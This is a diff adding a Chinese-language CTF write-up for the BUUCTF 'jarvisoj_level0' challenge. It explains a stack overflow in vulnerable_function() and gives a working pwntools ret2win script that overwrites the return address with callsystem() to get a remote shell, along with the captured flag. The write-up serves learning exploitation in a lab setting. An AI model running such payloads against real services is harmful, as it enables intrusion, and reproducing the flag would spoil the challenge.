@@ -171,3 +171,42 @@ io.interactive()
 
 ------
 
+### [jarvisoj_level0](https://buuoj.cn/challenges#jarvisoj_level0)
+
+先`file ./test`查看文件类型和`checksec --file=test`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/1.png)
+
+用`IDA Pro 64bit`打开`level0`后按`F5`反汇编源码并查看主函数，发现问题的关键在于`vulnerable_function()`函数。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/2.png)
+
+双击`vulnerable_function()`函数可以看到`buf`的长度只有`0x80`，即可用栈大小只有`108`字节，但是`read()`并没有限制输入，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/3.png)
+
+在`Functions window`可以看到有一个`callsystem()`函数，按`F5`反汇编可以看到这是一个系统调用，且`callsystem()`函数的起始地址为`0x400596`。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/4.png)
+
+编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25719`，`buf`需覆盖`0x80`个字节覆盖，再加上`rbp`的`0x8`个字节，最后加上`callsystem()`函数的起始地址`0x400596`构成`payload`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 25719)
+e = ELF('level0')
+address = e.symbols['callsystem']
+log.success('callsystem_address => {}'.format(hex(address).upper()))
+payload = b'a'*(0x80 + 0x8) + p64(address)
+# payload = b'a'*(0x80 + 0x8) + p64(0x400596)
+io.sendline(payload)
+io.interactive()
+```
+
+发送`payload`监听成功后`ls`查看文件目录再`cat flag`即可得到`flag{af006b52-6eb0-4df4-9706-dcbb4dc8cff2}`。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/5.png)
+
+------
+
